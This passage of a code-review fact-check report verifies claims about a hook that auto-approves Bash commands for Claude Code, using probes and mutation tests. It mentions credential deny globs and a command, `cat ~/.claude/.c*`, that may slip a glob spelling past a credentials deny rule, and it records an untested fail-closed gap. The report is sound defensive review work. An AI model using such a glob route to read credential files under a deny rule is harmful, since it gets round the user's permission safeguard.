The test puts a credentials glob rule plus a bare `Bash` deny rule in the global file and `Bash(ls:*)` in the project's deny list, then asserts `approved` for `$PLAIN` and `ls -la`. P7 builds four mutants: a raw `*credentials*` exit, failing closed on any `Bash...` deny string, failing closed on a bare `Bash` deny rule only, and failing closed on project `Bash(ls:*)` only. The test kills all four. A first-draft mutant that emitted `\u0001` records survived. It was equivalent: parse_bash_rule ignores non-Bash strings, so that mutant changed no behaviour.

**Evidence:** `test/auto-approve-allowed-commands.bats:172-182`, `$A/logs/probes.txt` (P7)

---

## Claim 26: "settings files of the wrong shape fail closed"

**Location:** `test/auto-approve-allowed-commands.bats:206-218`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the loop's 12 inputs (global slot only) and its power against five shape mutants. Does not cover a bad file after a good one (Claim 23's gap).

P7: mutants that accept `permissions: null`, accept `deny: null`, skip the ask check, accept `deny: false` or accept `allow: null` are each killed by this test. Each item of the loop is one of P4's rc=5 rows.

**Evidence:** `test/auto-approve-allowed-commands.bats:206-218`, `$A/logs/probes.txt` (P4, P7)

---

## Claim 27: "a NUL inside a settings deny or ask rule fails closed"

**Location:** `test/auto-approve-allowed-commands.bats:290-298`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers deny and ask separately (the loop fails on either). Does not cover NUL in allow, which test 19 covers.

P7: a mutant without the NUL check on ask is killed, and so is one without it on deny. Each loop iteration ends in `not_approved || { echo "approved with a NUL in $k"; return 1; }` (`:296`), so the first key cannot mask the second.

**Evidence:** `test/auto-approve-allowed-commands.bats:290-298`, `$A/logs/probes.txt` (P7)

---

## Claim 28: "DENY_GLOBS, add_deny_rule, matches_deny and both of its calls are gone ... The hook emits only "allow" or nothing, never the "ask" that #39344 shows overriding deny (pinned in unit 1)."

**Location:** commit ed06dec1 message
**Type:** Behavioral / Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers removal of the named symbols and that the stdout test came from unit 1. The #39344 content is Claim 14.

The ed06dec1 diff removes `DENY_GLOBS=()`, `add_deny_rule()`, `matches_deny()` and both `if matches_deny ...` blocks in main (diff hunks at old `:177-183`, `:300-322`, `:359-381`, `:402-407`, `:416-419`). The stdout test exists at the unit-1 tip: `git show 5ba83a3a:test/auto-approve-allowed-commands.bats` line 147 is `@test "the hook's stdout is empty or exactly the allow decision: never ask, deny or defer"`.

**Evidence:** `git diff fix/q092a-drop-deny-option 73698a91 -- hooks/auto-approve-allowed-commands.sh`, `test/auto-approve-allowed-commands.bats:147`

---

## Claim 29: "It still fails closed on its inputs: an unreadable or ill-shaped settings file, including a permissions.deny that is not an array of strings, leaves no allow rules."

**Location:** commit ed06dec1 message
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the claim at its own commit (ed06dec1). Does not affect HEAD: later commits changed this behaviour, and HEAD's wording is Claim 17.

At ed06dec1 (P5), `deny: null` gives rc=0 and keeps the allow rule, and `deny: false` gives rc=0. Both are "not an array of strings" yet were accepted. `deny: [5]` gives rc=5 as claimed. Prior rubric item C1 covers the same gap. 72b8c825 (null and false) and 0444b1ac (non-strings now skipped) superseded it. Precise version at the time: "...including a permissions.deny that is a non-array value other than null or false, or holds a non-string".

**Evidence:** `$A/probe-jq-base.sh`, `$A/logs/probes.txt` (P5)

---

## Claim 30: "A relative or newline-bearing CLAUDE_CONFIG_DIR still approves nothing, now because a wrongly resolved file could add allow rules. With --permissions the settings files are no longer read."

**Location:** commit ed06dec1 message
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers both behaviours at HEAD (unchanged since ed06dec1). Does not cover the stated rationale beyond the code comment that carries it.

`return 1` on a relative value (`hooks/auto-approve-allowed-commands.sh:179-182`) and on a newline (`:187-190`). Tests 17 and 18 pass (P1). `--permissions` takes the `if` branch, which never calls `read_settings_rules` (`:235-239`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:173-200`, `hooks/auto-approve-allowed-commands.sh:232-248`, `test/auto-approve-allowed-commands.bats:257-276`, `$A/logs/probes.txt` (P1)

---

## Claim 31: "No gate trailer: hooks/, test/, guides/ and docs/ are outside live-verify-gate's sets. wiring.json changes only _comment, which the linker does not merge."

**Location:** commit ed06dec1 message (Notes)
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the gate's two regexes against the six changed paths, and the linker's `_` filter. Does not cover other gates.

`enforcement='^devcontainer-config/(Dockerfile|devcontainer\.json|...|egress/)'` (`hooks/live-verify-gate.sh:83`) and `host_tools='^devcontainer-config/(cc-exit-scan\.sh|cc-gitdir\.sh|cc-push\.sh)'` (`:91`) match only `devcontainer-config/` paths. The linker applies `with_entries(select(.key | startswith("_") | not))` (`devcontainer-config/link-claude-home.sh:135`). The wiring.json diff touches only lines inside `_comment`, and the linker suite passes 16/16 (P2).

**Evidence:** `hooks/live-verify-gate.sh:83`, `hooks/live-verify-gate.sh:91`, `devcontainer-config/link-claude-home.sh:133-136`, `$A/logs/probes.txt` (P2)

---

## Claim 32: "Unit size vs unit 1 is 409 (loop tolerance ~800)."

**Location:** commit 72b8c825 message (a merge, so outside `--no-merges`; checked because the brief names the size figures)
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers 409 against the base as it stood at 72b8c825, and the 420 and 436 figures named in the brief. Does not establish the ~800 tolerance, which is a policy number.

The brief's command gives `git diff --numstat b973e678..72b8c825 -- ':(top)' ':(top,exclude)docs/'` = 409. b973e678 was unit 1's tip then and is 72b8c825's second parent. Against today's base (5ba83a3a) the same commit gives 413, because unit 1 moved. 420 and 436 appear in no commit message in range. They reproduce as fdae7834 (and c9ff3e84) vs 5ba83a3a = 420 and 0444b1ac (and 73698a91) vs 5ba83a3a = 436.

**Evidence:** `$A/logs/probes.txt` (P11)

---

## Claim 33: "The pass-2 fact-check found FAILS CLOSED overstated: `permissions: null` was accepted as absent. A present permissions key must now be an object; a test case pins it. ... Stricter than before (null used to read as no permissions)."

**Location:** commit fdae7834 message
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the before (72b8c825) and after behaviour and the pinning test. Does not re-verify the pass-2 report's other content.

P5: at 72b8c825, `permissions null` gives rc=0 with empty output, so null was read as "no permissions". At fdae7834 and HEAD it gives rc=5. The wrong-shape loop includes `'{"permissions":null}'` (`test/auto-approve-allowed-commands.bats:209`), and the matching mutant is killed (P7).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:158-159`, `test/auto-approve-allowed-commands.bats:209`, `$A/logs/probes.txt` (P5, P7)

---

## Claim 34: "Non-string entries in allow, deny and ask are now skipped; a non-array value or a NUL inside a string still fails closed."

**Location:** commit 0444b1ac message
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the behaviour at 0444b1ac and HEAD (the merge 73698a91 changes no code). Claude Code's matching behaviour is Claim 4b.

Same evidence as Claims 4a and 17. P5 at fdae7834 shows `allow [5]` and `ask [5]` gave rc=5 before this commit. P4 at HEAD shows rc=0 for both.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:161-166`, `$A/logs/probes.txt` (P4, P5)

---

## Claim 35: "The NUL check uses test("\u0000") (pass-2 performance: ~10x faster than explode at scale; contains() is wrong on jq 1.6)."

**Location:** commit 0444b1ac message
**Type:** Performance / Behavioral
**Verdict:** Verified
**Confidence:** Medium
**Verification mode:** executed
**Scope:** Covers the speed ratio on 6000 allow strings with jq-1.6 and the contains() fault. Does not establish timings on other hosts. The ratio depends on whether jq's fixed cost is subtracted.

P12, 5 runs each: `test` takes 34 ms/run, `explode | any(. == 0)` 174 ms/run, and a baseline with no check 23 ms/run. That is about 14x on the check's marginal cost and about 5x on the whole call. "~10x at scale" fits the marginal reading. The contains() fault is confirmed in P4 (Claim 21).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:163`, `$A/logs/probes.txt` (P4, P12)

---

## Claim 36: "deny:[1] used to fail closed (before this stack) and is now skipped"

**Location:** commit 0444b1ac message (Notes)
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook before the stack (1a831ffe^) and at HEAD. "matching Claude Code" is Claim 4b.

P5 pre-stack: `deny [5]` gives rc=5 with "non-string deny rule". P4 HEAD: `deny [5]` gives rc=0.

**Evidence:** `$A/logs/probes.txt` (P4, P5)

---

## Claim 37: "The RESIDUAL now says "anything Claude Code rejects that this check accepts" (pass-2 security: jq also accepts NaN/Infinity). Log row 53 and rubric updated; pass-2 critic reports added."

**Location:** commit 0444b1ac message
**Type:** Reference
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the header wording, jq-1.6 accepting NaN, and the files the commit touches. Does not cover Infinity separately or re-verify the critic reports' content.

The header reads "RESIDUAL: anything Claude Code rejects that this check accepts (another key's value, a BOM, jq-only literals such as NaN)" (`hooks/auto-approve-allowed-commands.sh:81-83`). P4 and P10 show NaN accepted. `git log --stat` for 0444b1ac lists `docs/decisions/log.md`, the q092b rubric, `critics-q092b-pass2-2026-10-15.md` and `security-review-q092b-pass2-2026-10-15.md` (paraphrased — no quote available because this is a file list from git output).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:81-85`, `$A/logs/probes.txt` (P4, P10)

---

## Live text still describing a hook deny reader (brief item 8)

`rg -i 'deny check|deny reader|reads? (bash )?deny rules|WHAT THE DENY CHECK|matches_deny|DENY_GLOBS|add_deny_rule|de-quoted|--deny'`, plus an `auto-approve` × `deny|backstop|credential` sweep, over the repo excluding docs/reviews, archive, docs/working and runs. Every hit describes the removal or is the `--deny`-ignored test. The one exception is row 53's 2026-09-27 amendment, which describes the old deny check as history and is explicitly superseded by the 2026-10-15 amendment in the same cell. No live text says the hook reads deny rules today. Row 53's Q-081 pointer (Claim 9) is the only stale sentence found, and it is about the sandbox, not the deny reader.

---

## Claims Requiring Attention

### Incorrect
(none)

### Stale
- **Claim 9** (`docs/decisions/log.md:76`): "open as a follow-up question (Q-081)". Q-081 was answered on 2026-09-28. The open sandbox item is Q-125 (built, unmerged). Point at Q-125, as the hook header already does.

### Mostly Accurate
- **Claim 3** (`docs/decisions/log.md:76`): "now also" lists cases that already failed closed (`permissions: []`, allow or deny given as a string or object, NUL in allow or deny). Only `permissions: null`, null or false allow/deny, and every malformed `ask` are new.
- **Claim 11** (`guides/bare-host-hook-wiring.md:160-161`): RULE SYNTAX is now allow-only and says nothing about what the deny backstop leaves. Only DENY RULES ARE CLAUDE CODE'S does.
- **Claim 13** (`hooks/auto-approve-allowed-commands.sh:51`): "nothing (exit 0 ...)". For stdin that is not a JSON object the hook exits 4 or 5 with empty stdout. That exit is not 2, and Claude Code never sends such stdin.
- **Claim 29** (commit ed06dec1): "a permissions.deny that is not an array of strings" fails closed. At that commit, `deny: null` and `deny: false` were accepted. This is superseded and does not apply at HEAD.

### Unverifiable
- **Claim 4b** (`docs/decisions/log.md:76`, `hooks/auto-approve-allowed-commands.sh:80-81,148`, test title `:220`, commit 0444b1ac): Claude Code drops non-string entries with a warning. Verifying it needs a Claude Code run.
- **Claim 6** (`docs/decisions/log.md:76`, `hooks/auto-approve-allowed-commands.sh:70-72`, `hooks/wiring.json:44-45`, `guides/bare-host-hook-wiring.md:159-160`): Claude Code's matcher lets a glob spelling through. Verifying it needs a host run of `cat ~/.claude/.c*` under the wired rule. The hook half is verified.
- **Claim 7** (`docs/decisions/log.md:76`, `hooks/auto-approve-allowed-commands.sh:78-85`): which values make Claude Code drop a whole settings file. Verifying it needs a trace or a run of Claude Code's validator. The hook half (BOM, NaN, `defaultMode` accepted) is verified.
- **Claim 14** (`hooks/auto-approve-allowed-commands.sh:53-54`): the content of #39344. Verifying it needs network access or a host run.

### Test-coverage note (not a claim verdict)
- **Claim 23** (`hooks/auto-approve-allowed-commands.sh:230-231`): the partial-output discard is real (executed), but no test pins it. Removing `return 0` from load_rules' failure branch passes all 35 tests and approves from a good global file when the project file is bad (P8). Every fail-closed test puts the bad file first.

---

## Goal-Alignment Note

Goal: land Q-092 unit 2 (remove the hook's own Bash deny reader, since Q-082 showed `permissions.deny` beats a hook `allow`), reviewed clean. On the points the brief named, the code does what the docs say. The hook reads no deny rules and its stdout is only the allow JSON or nothing, and both are pinned by tests that kill targeted mutants. The fail-closed shape check matches its header on jq-1.6, including partial-output discard, `contains()` vs `test()` and the non-string skip. The RULE SYNTAX table and `parse_bash_rule` match after RULE_LEGACY's removal, and the 409 size figure reproduces. Four Mostly accurate items and one Stale pointer are wording-level and change no behaviour: the "now also" list, the guide's RULE SYNTAX pointer, the exit-0 parenthetical, ed06dec1's historical "array of strings" and row 53's Q-081 pointer. The four Unverifiable items are all claims about Claude Code's own behaviour (non-string handling, glob matching, whole-file drop, #39344). They are the accepted, host-only residuals the plan already records (F3-F6, rubric C7/C10). This pass found nothing beyond them that bears on the security premise. The one new observation is the untested partial-output discard (Claim 23), a coverage gap in a property that holds today.
